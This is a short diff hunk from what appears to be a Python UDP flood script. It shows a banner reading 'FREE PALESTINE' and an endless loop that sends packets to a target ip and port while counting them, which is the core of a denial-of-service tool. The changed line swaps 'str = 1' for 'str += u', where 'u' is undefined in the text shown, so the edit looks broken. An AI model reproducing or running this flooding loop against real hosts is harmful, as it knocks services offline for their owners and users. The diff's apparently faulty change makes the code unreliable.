@@ -50,7 +50,7 @@ time.sleep(5),
 print("\033[95m[\033[31m+\033[36m]                     ⟩⟩ FREE PALESTINE \033[0m ")
 
 sent = 0
-str = 1
+str += u
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
